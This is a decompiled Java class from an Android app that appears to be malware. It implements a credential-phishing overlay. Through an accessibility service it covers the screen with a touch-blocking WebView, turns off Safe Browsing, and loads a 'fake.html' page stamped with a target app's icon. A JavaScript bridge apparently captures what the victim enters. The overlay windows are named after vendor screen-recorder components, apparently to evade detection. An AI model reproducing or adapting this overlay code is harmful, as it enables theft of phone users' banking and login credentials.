package defpackage;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.LayoutInflater;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.FrameLayout;
import androidx.work.impl.WorkDatabaseVersions;
import com.mamimobi.AccessService;
import com.mamimobi.mipush.R$id;
import com.mamimobi.mipush.R$layout;
import io.nats.client.Options;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

/* JADX INFO: loaded from: classes.dex */
public final class pv {
    public Context a;
    public final WindowManager b;
    public FrameLayout c;
    public WebView d;
    public String e;
    public volatile String g;
    public volatile boolean f = false;
    public final nv h = new nv(this);
    public final jv i = new jv(1);

    public pv(AccessService accessService, WindowManager windowManager) {
        Context applicationContext = accessService.getApplicationContext();
        this.a = applicationContext;
        this.b = windowManager;
        try {
            FrameLayout frameLayout = (FrameLayout) LayoutInflater.from(applicationContext).inflate(R$layout.overlay_fullscreen, (ViewGroup) null);
            this.c = frameLayout;
            frameLayout.setKeepScreenOn(true);
            this.c.setBackgroundColor(-657931);
            this.c.setOnTouchListener(new mv(0));
            WebView webView = (WebView) this.c.findViewById(R$id.mywebview);
            this.d = webView;
            a(webView);
            WindowManager.LayoutParams layoutParamsC = c();
            layoutParamsC.flags &= -17;
            FrameLayout frameLayout2 = this.c;
            if (frameLayout2 != null) {
                frameLayout2.setSystemUiVisibility(5894);
            }
            this.c.setVisibility(8);
            windowManager.addView(this.c, layoutParamsC);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String b(Context context, String str) {
        try {
            Bitmap bitmapE = e(context.getPackageManager().getApplicationIcon(str));
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            bitmapE.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
            return "data:image/png;base64," + Base64.encodeToString(byteArrayOutputStream.toByteArray(), 2);
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    public static Bitmap e(Drawable drawable) {
        if (drawable instanceof BitmapDrawable) {
            return ((BitmapDrawable) drawable).getBitmap();
        }
        int intrinsicWidth = drawable.getIntrinsicWidth();
        int intrinsicHeight = drawable.getIntrinsicHeight();
        if (intrinsicWidth <= 0) {
            intrinsicWidth = 512;
        }
        if (intrinsicHeight <= 0) {
            intrinsicHeight = 512;
        }
        Bitmap bitmapCreateBitmap = Bitmap.createBitmap(intrinsicWidth, intrinsicHeight, Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(bitmapCreateBitmap);
        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable.draw(canvas);
        return bitmapCreateBitmap;
    }

    public final void a(WebView webView) {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        if (Build.VERSION.SDK_INT >= 26) {
            settings.setSafeBrowsingEnabled(false);
        }
        webView.setScrollBarStyle(0);
        webView.setWebViewClient(this.h);
        webView.setWebChromeClient(this.i);
        webView.addJavascriptInterface(new ov(this), "Android");
        try {
            InputStream inputStreamOpen = this.a.getAssets().open("fake.html");
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] bArr = new byte[Options.DEFAULT_MAX_CONTROL_LINE];
            while (true) {
                int i = inputStreamOpen.read(bArr);
                if (i < 0) {
                    inputStreamOpen.close();
                    this.e = new String(byteArrayOutputStream.toByteArray(), StandardCharsets.UTF_8);
                    byteArrayOutputStream.close();
                    return;
                }
                byteArrayOutputStream.write(bArr, 0, i);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public final WindowManager.LayoutParams c() {
        this.b.getDefaultDisplay().getRealMetrics(new DisplayMetrics());
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, -1, 2032, 9984, -3);
        layoutParams.gravity = 51;
        if (Build.VERSION.SDK_INT >= 28) {
            layoutParams.layoutInDisplayCutoutMode = 1;
        }
        int iA0 = t40.a0();
        if (iA0 == 1) {
            layoutParams.setTitle("ScreenRecorderTimer");
            return layoutParams;
        }
        if (iA0 == 2) {
            layoutParams.flags |= Options.DEFAULT_MAX_CONTROL_LINE;
            layoutParams.setTitle("com.miui.screenrecorder");
            return layoutParams;
        }
        if (iA0 == 3) {
            layoutParams.setTitle("com.oplus.screenrecorder.FloatView");
            return layoutParams;
        }
        if (iA0 == 4) {
            layoutParams.setTitle("screen_record_menu");
            return layoutParams;
        }
        switch (iA0) {
            case WorkDatabaseVersions.VERSION_15 /* 15 */:
                layoutParams.setTitle("NubiaScreenDecorOverlay");
                break;
            case 16:
                layoutParams.setTitle("com.blackshark.screenrecorder");
                break;
            case 17:
                layoutParams.setTitle("com.asus.force.layer.transparent.SR.floatingpanel");
                break;
        }
        return layoutParams;
    }

    public final void d() {
        WindowManager windowManager;
        if (Looper.myLooper() != Looper.getMainLooper()) {
            new Handler(Looper.getMainLooper()).post(new lv(this, 0));
            return;
        }
        if (this.f) {
            return;
        }
        this.f = true;
        try {
            FrameLayout frameLayout = this.c;
            if (frameLayout != null) {
                frameLayout.setVisibility(8);
            }
            FrameLayout frameLayout2 = this.c;
            if (frameLayout2 != null && (windowManager = this.b) != null) {
                try {
                    windowManager.removeViewImmediate(frameLayout2);
                } catch (Exception unused) {
                }
            }
            WebView webView = this.d;
            if (webView != null) {
                try {
                    webView.stopLoading();
                    this.d.loadUrl("about:blank");
                    this.d.onPause();
                    this.d.pauseTimers();
                    this.d.clearHistory();
                    this.d.clearCache(true);
                    this.d.removeAllViews();
                    this.d.setWebChromeClient(null);
                    this.d.setWebViewClient(null);
                    try {
                        this.d.removeJavascriptInterface("Android");
                    } catch (Exception unused2) {
                    }
                    ViewGroup viewGroup = (ViewGroup) this.d.getParent();
                    if (viewGroup != null) {
                        viewGroup.removeView(this.d);
                    }
                    this.d.destroy();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                this.d = null;
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        this.c = null;
        this.e = null;
        this.a = null;
    }

    public final void f() {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            new Handler(Looper.getMainLooper()).post(new lv(this, 1));
            return;
        }
        try {
            FrameLayout frameLayout = this.c;
            if (frameLayout != null) {
                frameLayout.setVisibility(8);
            }
            WebView webView = this.d;
            if (webView != null) {
                webView.onPause();
                this.d.pauseTimers();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public final void g(String str) {
        String str2;
        if (Looper.myLooper() != Looper.getMainLooper()) {
            new Handler(Looper.getMainLooper()).post(new p7(this, 8, str));
            return;
        }
        if (this.f || this.c == null || this.d == null || (str2 = this.e) == null || str2.isEmpty()) {
            return;
        }
        try {
            this.g = str;
            this.c.setVisibility(0);
            this.d.onResume();
            this.d.resumeTimers();
            this.d.loadDataWithBaseURL("file:///android_asset/", this.e.replace("%APP_ICON%", b(this.a, str)), "text/html", "UTF-8", null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
